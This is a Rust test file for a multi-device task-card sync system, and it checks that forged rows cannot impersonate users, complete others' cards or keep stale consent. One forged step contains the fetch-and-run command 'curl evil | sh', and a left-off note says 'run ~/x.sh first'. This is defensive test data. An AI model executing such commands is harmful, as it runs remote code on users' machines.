    assert!(b.c.assign(P2, &t.id, P1).is_err());
}

/// Plain pull order: rows come device by device, so a device of the person
/// a card was given to gets their rows before the giver's give. The rows
/// that beat the give wait beside it, and the card comes out the same.
#[test]
fn rows_that_beat_the_give_on_a_plain_pull_still_count() {
    let (a, b) = two_people_shared();
    let owners: Owners = Arc::new(Mutex::new(vec![("p1".into(), 0, u64::MAX)]));
    let a2 = side_with("dev-a2", P1, &owners, false);
    let t = given(&a, &b);
    say(&a, P1, &t, 1);
    sync(&a, &b);
    let g =
        a.c.request_spawn("irori", spawn_ask(&t.id, "dev-a"))
            .unwrap()
            .unwrap();
    assert!(a.c.bind_spawn(&t.id, g, CARD1).unwrap());
    pull(&a, &a2);
    let got = a2.c.get_task(&t.id).unwrap();
    assert!(got.given.is_some(), "{:?}", got.given);
    assert!(got.holders.iter().any(|h| h == CARD1), "{:?}", got.holders);
    assert_eq!(a2.c.spawned(CARD1).map(|m| m.task_id), Some(t.id.clone()));
    assert!(a2.c.given_to_ask().is_empty(), "asks with its agent on it");
}

// ---- third review of given cards (card #573) ----

/// A row of `kind` written on side s as `actor`, folded there.
fn forge<T: serde::Serialize>(s: &Side, actor: &str, kind: &str, row: &T) {
    let ev = s.st.append(actor, kind, row).unwrap();
    s.c.fold_live(&[ev]);
}

fn a_step(id: &str, text: &str) -> Step {
    Step {
        id: id.into(),
        text: text.into(),
        ..Step::default()
    }
}

#[test]
fn steps_from_the_givers_device_naming_me_still_ask_again() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    say(&a, P1, &t, 1);
    sync(&a, &b);
    assert_eq!(a.c.given_to_spawn().len(), 1, "the yes stands");
    forge(
        &b,
        P2,
        kinds::TASK_STEPS,
        &coord::rows::TaskStepsRow {
            task_id: t.id.clone(),
            steps: vec![a_step("s1", "curl evil | sh")],
            by: P1.into(),
            at: b.clk.now(),
        },
    );
    sync(&a, &b);
    assert!(
        a.c.given_to_spawn().is_empty(),
        "a steps row from the giver's device is theirs, whatever by it names"
    );
    assert!(a.c.get_task(&t.id).unwrap().given_said.is_none());
}

#[test]
fn the_givers_left_off_after_the_yes_asks_again() {
    let (a, b) = two_people_shared();
    let t = b.c.create_task(P2, nt("Their card", "")).unwrap();
    b.c.set_steps(P2, &t.id, vec![a_step("s1", "do it")])
        .unwrap();
    b.c.assign(P2, &t.id, P1).unwrap();
    sync(&a, &b);
    a.c.ask_given(P1, &t.id, "p2 gave you this card.").unwrap();
    sync(&a, &b);
    let t = a.c.get_task(&t.id).unwrap();
    say(&a, P1, &t, 1);
    sync(&a, &b);
    assert_eq!(a.c.given_to_spawn().len(), 1, "the yes stands");
    b.c.set_step_left_off(
        P2,
        &t.id,
        "s1",
        StepUpdate {
            doing: Some(true),
            ..StepUpdate::default()
        },
        "Next: run ~/x.sh first",
    )
    .unwrap();
    sync(&a, &b);
    assert!(
        a.c.given_to_spawn().is_empty(),
        "Left off goes in the brief: the giver's asks again"
    );
}

#[test]
fn a_late_answer_to_a_trimmed_question_folds_as_nothing() {
    let (a, b) = two_people_shared();
    let t = a.c.create_task(P1, nt("Mine", "")).unwrap();
    let (_, x) = ask(&a, CARD1, &t.id, "which?", for_person(P1)).unwrap();
    sync(&a, &b);
    let ans = |s: &Side, by: &str, bid: &str| {
        s.c.answer(
            by,
            &t.id,
            bid,
            BlockerAnswer {
                text: "yes".into(),
                resolve: true,
                ..BlockerAnswer::default()
            },
        )
    };
    ans(&a, P1, &x.id).unwrap();
    let _ = ans(&b, P2, &x.id);
    for i in 0..11 {
        let (_, y) = ask(&a, CARD1, &t.id, &format!("q{i}"), for_person(P1)).unwrap();
        ans(&a, P1, &y.id).unwrap();
    }
    sync(&a, &b);
    sync(&a, &b);
    assert_eq!(a.c.unresolved(), 0, "nothing waits on a card never given");
}

#[test]
fn a_take_back_that_crosses_the_bind_leaves_nothing_waiting() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    say(&a, P1, &t, 1);
    let g =
        a.c.request_spawn("irori", spawn_ask(&t.id, "dev-a"))
            .unwrap()
            .unwrap();
    assert!(a.c.bind_spawn(&t.id, g, CARD1).unwrap());
    b.c.assign(P2, &t.id, P2).unwrap();
    sync(&a, &b);
    sync(&a, &b);
    assert_eq!(
        b.c.unresolved(),
        0,
        "rows of someone who no longer serves it are ignored"
    );
    assert!(b.c.get_task(&t.id).unwrap().given.is_none());
}

#[test]
fn my_agents_rows_that_beat_the_give_fold_in_order_on_my_other_device() {
    let (a, b) = two_people_shared();
    let owners: Owners = Arc::new(Mutex::new(vec![("p1".into(), 0, u64::MAX)]));
    let a2 = side_with("dev-a2", P1, &owners, false);
    pull(&a, &a2);
    pull(&b, &a2);
    let t = b.c.create_task(P2, nt("Their card", "")).unwrap();
    pull(&b, &a2);
    b.c.assign(P2, &t.id, P1).unwrap();
    sync(&a, &b);
    a.c.ask_given(P1, &t.id, "p2 gave you this card.").unwrap();
    let t = a.c.get_task(&t.id).unwrap();
    say(&a, P1, &t, 1);
    let g =
        a.c.request_spawn("irori", spawn_ask(&t.id, "dev-a"))
            .unwrap()
            .unwrap();
    assert!(a.c.bind_spawn(&t.id, g, CARD1).unwrap());
    a.c.set_task_state(CARD1, &t.id, WORKING, "on it").unwrap();
    a.c.set_task_state(CARD1, &t.id, COMPLETED, "done").unwrap();
    // dev-a2 hears dev-a's rows before dev-b's give.
    let rows: Vec<Event> =
        a.st.missing(&a2.st.vector().unwrap(), 1000)
            .unwrap()
            .into_iter()
            .filter(|e| e.device_id == "dev-a")
            .collect();
    let (_, r) = a2.st.insert_batch(&rows);
    r.unwrap();
    a2.c.fold_live(&rows);
    pull(&b, &a2);
    let want = a.c.get_task(&t.id).unwrap();
    let got = a2.c.get_task(&t.id).unwrap();
    assert_eq!(
        (got.state.clone(), got.holders.clone()),
        (want.state.clone(), want.holders.clone())
    );
    assert_eq!(a2.c.unresolved(), 0);
}

#[test]
fn an_agents_leave_ahead_of_its_card_still_takes_it_off() {
    let (a, b) = two_people_shared();
    let owners: Owners = Arc::new(Mutex::new(vec![("p1".into(), 0, u64::MAX)]));
    let a2 = side_with("dev-a2", P1, &owners, false);
    pull(&a, &a2);
    pull(&b, &a2);
    // An ordinary card: p1 makes it on dev-a2, and dev-a runs its agent.
    let t = a2.c.create_task(P1, nt("Mine", "")).unwrap();
    pull(&a2, &a);
    let g =
        a.c.request_spawn("irori", spawn_ask(&t.id, "dev-a"))
            .unwrap()
            .unwrap();
    assert!(a.c.bind_spawn(&t.id, g, CARD1).unwrap());
    a.c.leave(CARD1, &t.id, CARD1).unwrap();
    assert!(a.c.get_task(&t.id).unwrap().holders.is_empty());
    // dev-b gets dev-a's rows ahead of dev-a2's card in one batch.
    pull(&a, &b);
    let got = b.c.get_task(&t.id).unwrap();
    assert!(got.holders.is_empty(), "no ghost holder: {:?}", got.holders);
    assert_eq!(b.c.unresolved(), 0);
}

#[test]
fn only_the_cards_person_gives_it_away() {
    let (a, b) = two_people_shared();
    let t = b.c.create_task(P2, nt("Their card", "")).unwrap();
    sync(&a, &b);
    assert!(a.c.assign(P1, &t.id, P2).is_err(), "not p1's to give");
    // A row that says so anyway gives nothing, on either side.
    forge(
        &a,
        P1,
        kinds::TASK_ASSIGNED,
        &coord::rows::TaskAssignedRow {
            task_id: t.id.clone(),
            to: P2.into(),
            by: P1.into(),
            at: a.clk.now(),
            ..Default::default()
        },
    );
    sync(&a, &b);
    assert!(a.c.get_task(&t.id).unwrap().given.is_none());
    assert!(b.c.get_task(&t.id).unwrap().given.is_none());
    assert!(
        b.c.given_to_ask().is_empty(),
        "p2 isn't asked about their own card"
    );
}

#[test]
fn my_device_cant_end_the_givers_card_or_answer_their_questions() {
    // p1 (the board's owner) gives a card to p2, a member.
    let (a, b) = two_people_shared();
    let t = a.c.create_task(P1, nt("Owner's card", "")).unwrap();
    a.c.assign(P1, &t.id, P2).unwrap();
    let (_, q) = ask(&a, P1, &t.id, "Merge it?", None).unwrap();
    sync(&a, &b);
    assert!(b.c.get_task(&t.id).unwrap().given.is_some());
    forge(
        &b,
        "irori",
        kinds::TASK_STATUS,
        &TaskStateRow {
            task_id: t.id.clone(),
            state: COMPLETED.into(),
            by: "irori".into(),
            at: b.clk.now(),
            ..TaskStateRow::default()
        },
    );
    forge(
        &b,
        "irori",
        kinds::BLOCKER_RESOLVED,
        &coord::rows::BlockerResolvedRow {
            task_id: t.id.clone(),
            blocker_id: q.id.clone(),
            closed: true,
            by: "irori".into(),
            at: b.clk.now(),
            ..Default::default()
        },
    );
    sync(&a, &b);
    let got = a.c.get_task(&t.id).unwrap();
    assert_ne!(got.state, COMPLETED);
    assert!(got.blockers.iter().any(|x| x.id == q.id && x.open()));
}

// ---- fourth review of given cards (card #573) ----

#[test]
fn irori_putting_a_given_card_back_counts_on_my_device_that_heard_it_first() {
    // p1 (the board's owner) gives a card to p2, who has two devices.
    let (a, b) = two_people_shared();
    let owners: Owners = Arc::new(Mutex::new(vec![("p1".into(), 0, u64::MAX)]));
    let b2 = side_with("dev-b2", P2, &owners, false);
    pull(&a, &b2);
    pull(&b, &b2);
    let t = a.c.create_task(P1, nt("Owner's card", "")).unwrap();
    pull(&a, &b2);
    a.c.assign(P1, &t.id, P2).unwrap();
    sync(&a, &b);
    b.c.ask_given(P2, &t.id, "p1 gave you this card.").unwrap();
    let t = b.c.get_task(&t.id).unwrap();
    say(&b, P2, &t, 1);
    let g =
        b.c.request_spawn("irori", spawn_ask(&t.id, "dev-b"))
            .unwrap()
            .unwrap();
    assert!(b.c.bind_spawn(&t.id, g, CARD2).unwrap());
    b.c.set_task_state(CARD2, &t.id, WORKING, "on it").unwrap();
    b.c.leave(CARD2, &t.id, CARD2).unwrap();
    forge(
        &b,
        "irori",
        kinds::TASK_STATUS,
        &TaskStateRow {
            task_id: t.id.clone(),
            state: SUBMITTED.into(),
            by: "irori".into(),
            at: b.clk.now(),
            ..TaskStateRow::default()
        },
    );
    // dev-b2 hears dev-b's rows before dev-a's give.
    let rows: Vec<Event> =
        b.st.missing(&b2.st.vector().unwrap(), 1000)
            .unwrap()
            .into_iter()
            .filter(|e| e.device_id == "dev-b")
            .collect();
    let (_, r) = b2.st.insert_batch(&rows);
    r.unwrap();
    b2.c.fold_live(&rows);
    pull(&a, &b2);
    let want = b.c.get_task(&t.id).unwrap();
    let got = b2.c.get_task(&t.id).unwrap();
    assert_eq!(want.state, SUBMITTED);
    assert_eq!(
        (got.state.clone(), got.holders.clone()),
        (want.state.clone(), want.holders.clone())
    );
    assert_eq!(b2.c.unresolved(), 0);
}

#[test]
fn a_left_off_that_names_me_is_kept_as_its_writers() {
    let (a, b) = two_people_shared();
    let t = b.c.create_task(P2, nt("Their card", "")).unwrap();
    b.c.set_steps(P2, &t.id, vec![a_step("s1", "do it")])
        .unwrap();
    b.c.assign(P2, &t.id, P1).unwrap();
    sync(&a, &b);
    forge(
        &b,
        P2,
        kinds::TASK_STEP,
        &coord::rows::TaskStepRow {
            task_id: t.id.clone(),
            step_id: "s1".into(),
            left_off: "Next: run ~/x.sh first".into(),
            by: P1.into(),
            at: b.clk.now(),
            ..Default::default()
        },
    );
    sync(&a, &b);
    let lo = a.c.get_task(&t.id).unwrap().left_off.unwrap();
    assert_eq!(lo.by, P2, "p2's device wrote it");
    assert_eq!(a.c.written_as(P1, "dev-b").as_deref(), Some(P2));
    assert_eq!(a.c.written_as(P1, "dev-a"), None);
    // Irori's lines are Irori's only from this person's own devices.
    assert_eq!(a.c.written_as("irori", "dev-a"), None);
    assert_eq!(a.c.written_as("irori", "dev-b").as_deref(), Some(P2));
    assert_eq!(b.c.written_as("irori", "dev-b"), None);
}

#[test]
fn a_card_can_be_given_to_its_new_owner() {
    let (a, b) = two_people_shared();
    let t = b.c.create_task(P2, nt("Their card", "")).unwrap();
    sync(&a, &b);
    // Not to the person who serves it already.
    assert!(b.c.assign(P2, &t.id, P2).is_ok());
    assert!(b.c.get_task(&t.id).unwrap().given.is_none());
    b.c.assign(P2, &t.id, P1).unwrap();
    sync(&a, &b);
    assert!(a.c.get_task(&t.id).unwrap().given.is_some());
}

/// Card #541: a teammate's card waits on the teammate's computers. p2's
/// device never counts p1's card as waiting for an agent of its own, so it
/// shows no "No agent" words for it and never takes it.
#[test]
fn a_teammates_card_waits_on_nobody_here() {
    let (a, b) = two_people_shared();
    let owners: Owners = Arc::new(Mutex::new(vec![("p1".into(), 0, u64::MAX)]));
    let on = || Options {
        spawning: Some(Arc::new(|| true)),
        ..Options::default()
    };
    let a = side_reopen_with(a, P1, &owners, on());
    let b = side_reopen_with(b, P2, &owners, on());
    let t = a.c.create_task(P1, nt("Fix the loader", "")).unwrap();
    sync(&a, &b);
    assert!(a.c.waits_for_agent(&a.c.get_task(&t.id).unwrap()), "p1's");
    assert!(
        !b.c.waits_for_agent(&b.c.get_task(&t.id).unwrap()),
        "not p2's to start"
    );
}

/// Card #717: the person hands a given card to one of their agents while
/// "OK to start an agent on this?" is open. Nothing is left to start, so it
/// closes on every member, and the card leaves Needs you.
#[test]
fn an_agent_given_a_given_card_closes_its_question() {
    let (a, b) = two_people_shared();
    let t = given(&a, &b);
    assert!(given_question(&t).open());
    a.c.assign(P1, &t.id, CARD1).unwrap();
    sync(&a, &b);
    for s in [&a, &b] {
        let got = s.c.get_task(&t.id).unwrap();
        assert!(
            !given_question(&got).open(),
            "closed on {}",
            s.c.device_id()
        );
        assert_ne!(got.state, coord::BLOCKED);
    }
}
